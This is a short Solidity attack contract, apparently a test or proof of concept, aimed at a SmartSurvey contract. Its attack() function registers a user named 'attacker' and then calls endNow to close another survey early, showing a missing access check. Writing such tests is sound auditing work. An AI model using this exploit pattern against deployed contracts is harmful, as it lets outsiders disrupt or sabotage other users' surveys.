// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {SmartSurvey} from "../src/SurveyContract.sol"; //import game contract

contract attackByEndNow {
    SmartSurvey public surveyContract;

    constructor(SmartSurvey _surveyContract) payable {
        surveyContract = _surveyContract;
    }

    function attack() public {
        surveyContract.registerUser("attacker", 1234); // register to create survey
        surveyContract.endNow("Survey 1");       
    }
}